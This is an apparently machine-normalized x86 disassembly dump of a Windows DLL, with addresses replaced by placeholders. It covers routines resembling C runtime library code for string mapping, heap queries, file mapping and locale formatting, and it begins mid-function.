mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_1002fb6b
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1000932c
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_10035d06
push [ ebp - 0x8 ]
call sub_10035d06
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_1001895f
push ebx
call sub_10035d06
push [ ebp - 0x8 ]
call sub_10035d06
push [ ebp - 0x4 ]
call sub_10035d06
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_10035d06
push [ esi + 0xb0 ]
call sub_10035d06
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_10069516
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10069550
push ecx
push rw-data
call sub_1005b710
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_10069590
push esi
mov esi ecx
mov edx 0x104
sub esi eax
lea ebx [ ebx ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor ecx ecx
mov [ eax ] cx
pop esi
retn
mov [ eax - 0x2 ] dx
pop esi
retn
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
mov [ eax - 0x2 ] dx
pop esi
retn
sub_100695d3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
pop ebp
retn
sub_10069606
push 0x8
mov eax sub_10085df9
call sub_10013486
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10059d69
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1002f11b
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10007a90
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10007a90
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10007a90
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10007a90
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_10013ab8
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1007f5d0
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_1007f5d0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10048a74
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10048a74
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_10069760
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ esp + 0xc ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ esp + 0xc ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10069881
push 0x8
mov eax sub_10085e14
call sub_10013486
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10059d69
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1004a031
push eax
call sub_10007a90
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1000c356
push eax
call sub_10007a90
add esp 0xc
mov [ esi + 0xc ] eax
call sub_10005db3
mov [ esi + 0x10 ] eax
call sub_10013ab8
retn 0x4
sub_100698f8
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_1002fb6b
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10083c9f
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_1005601d
push esi
call sub_10035d06
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_10035d06
pop ecx
mov [ esi + 0x4 ] ebx
sub_100699a0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100133e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100699c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_100680b6
pop ecx
pop ecx
sub_100699f0
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_10069a30
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10035ec0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10069a60
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x10 ]
sub eax edx
mov edi eax
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax edi
push eax
push ebx
push ecx
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ecx ]
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
cmp esi edi
jae r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
sub_10069ac6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_10035c1d
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10069b05
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004883d
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x18
sub_10069b80
push ebp
mov ebp esp
push 0xffffffff
push sub_10087981
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
sub esi 0xffffff80
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
sub edi 0xffffff80
jmp r-xdata
push esi
call sub_1003bb10
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_10069bdc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_10024fe9
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1002fbb0
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_10069c0f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
sub_10069cd0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10069d0f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1001c121
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_10069d50
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
pop edi
mov dl 0x6f
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
add dl dl
add dl dl
add dl dl
not dl
and dl 0x20
pop edi
or dl 0x58
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov dl [ edi + 0x1 ]
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_10069df0
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x71c71c6
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1000831a
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x71c71c7
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10012800
mov eax esi
cmp eax esi
jae r-xdata
sub_10069e60
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_10069e87
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_100030fa
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10069ec0
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10069f10
push ebp
mov ebp esp
push 0xffffffff
push sub_100893e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
push ebx
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0xc ]
push esi
push 0x0
mov [ ebp - 0x58 ] ecx
call sub_100017c0
mov edx [ esi ]
add esp 0xc
push 0x0
push edx
push 0x0
push 0x4
push 0x0
push 0xffffffff
call [ CreateFileMappingW@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esi ]
push eax
push 0x0
push 0x0
push 0xf001f
push edi
call [ MapViewOfFile@IAT ]
mov ecx [ ebp - 0x58 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
push ebx
push esi
push eax
mov eax [ ebp + 0xc ]
call sub_100017c0
mov edx [ ebp - 0x58 ]
mov eax [ edx ]
mov esi [ ebp - 0x60 ]
mov [ ebp - 0x58 ] edi
add esp 0xc
add esi 0xd4
lea edi [ ebp - 0x5c ]
mov [ ebp - 0x5c ] eax
call sub_10010960
push eax
push esi
lea esi [ ebp - 0x64 ]
call sub_10054ba0
xor eax eax
lea edx [ ebp - 0x38 ]
mov eax 0x11
call sub_10072600
xor esi esi
xor edx edx
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x54 ] dx
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] esi
lea edx [ eax + 0x2 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_1005ddc0
lea edx [ ebp - 0x54 ]
mov ecx 0xcc
mov [ ebp - 0x4 ] esi
call sub_100205a0
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x54 ]
push ecx
call sub_100187af
add esp 0x4
sub_1006a055
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_10041486
push esi
mov edi eax
call sub_10034acb
push esi
call sub_10041a47
push eax
call sub_1001307f
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10035d06
and [ esi + 0x1c ] 0x0
pop ecx
sub_1006a0d0
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_1002dff0
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_100187af
add esp 0x4
sub_1006a140
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1006e927
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_1006299d
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_1006a170
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx ]
push eax
mov eax [ edx ]
push eax
push ecx
call sub_1003159d
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_1006a1a0
push ebp
mov ebp esp
shr eax 0x1
mov ecx 0x0
je r-xdata
mov ecx 0x80070057
cmp eax 0x7fffffff
jbe r-xdata
mov eax ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x1 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10044a29
add esp 0x10
test eax eax
js r-xdata
test ecx ecx
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_1006a200
